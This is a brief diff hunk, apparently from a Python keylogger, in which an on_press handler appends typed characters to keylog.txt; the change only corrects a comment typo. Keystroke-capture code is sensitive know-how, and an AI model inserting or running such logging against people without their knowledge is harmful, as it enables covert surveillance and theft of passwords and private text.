@@ -37,7 +37,7 @@ def on_press(key):
     #The numbers are in a list because they are not characters
     numbers=["<96>","<97>","<98>","<99>","<100>","<101>","<102>","<103>","<104>","<105>"]
     print(f"{key} pressed")
-    with open('keylog.txt', 'a') as log: # this opensthe file as append and closes the file once its finished
+    with open('keylog.txt', 'a') as log: # This opens the file as append and closes the file once its finished
         try:
             if str(key) not in numbers:
                 log.write(str(key.char)) #If the key is a character it will be logged as a string
